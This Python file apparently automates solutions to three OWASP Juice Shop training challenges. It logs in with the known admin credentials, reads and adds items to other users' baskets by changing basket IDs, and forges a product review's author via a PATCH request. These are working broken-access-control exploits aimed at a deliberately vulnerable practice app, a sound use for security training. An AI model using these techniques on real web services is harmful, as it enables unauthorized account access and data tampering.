from core.base_solver import BaseSolver
from loguru import logger

class ViewBasketSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "basketAccessChallenge"

    def solve(self) -> bool:
        # Access another user's basket
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        data = login_res.json().get("authentication", {})
        token = data.get("token")
        my_bid = data.get("bid")
        headers = {"Authorization": f"Bearer {token}"}
        
        target_bid = 2 if my_bid != 2 else 1
        res = self.client.get(f"/rest/basket/{target_bid}", headers=headers)
        return res.status_code == 200

class ManipulateBasketSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "basketManipulateChallenge"

    def solve(self) -> bool:
        # Put item into another user's basket
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        data = login_res.json().get("authentication", {})
        token = data.get("token")
        my_bid = data.get("bid")
        headers = {"Authorization": f"Bearer {token}"}
        
        target_bid = 2 if my_bid != 2 else 1
        payload = {
            "ProductId": 1,
            "BasketId": str(target_bid),
            "quantity": 1
        }
        res = self.client.post("/api/BasketItems", json=payload, headers=headers)
        return res.status_code == 201

class ForgedReviewSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgedReviewChallenge"

    def solve(self) -> bool:
        # 1. Login to get token
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}

        # 2. Find a review
        res = self.client.get("/rest/products/1/reviews")
        reviews = res.json().get("data", [])
        if not reviews:
            self.client.put("/rest/products/1/reviews", json={"message": "Original"}, headers=headers)
            res = self.client.get("/rest/products/1/reviews")
            reviews = res.json().get("data", [])
        
        if not reviews: return False
        
        review = reviews[0]
        # 3. Patch the review as another author
        # POST /rest/products/reviews (Like)? No.
        # PATCH /rest/products/reviews (Update)
        # Search for updateProductReviews in server.ts -> app.patch('/rest/products/reviews', ...)
        payload = {
            "id": review.get("_id"),
            "message": "Forged update",
            "author": "someone_else@juice-sh.op"
        }
        res = self.client.patch("/rest/products/reviews", json=payload, headers=headers)
        return res.status_code == 200
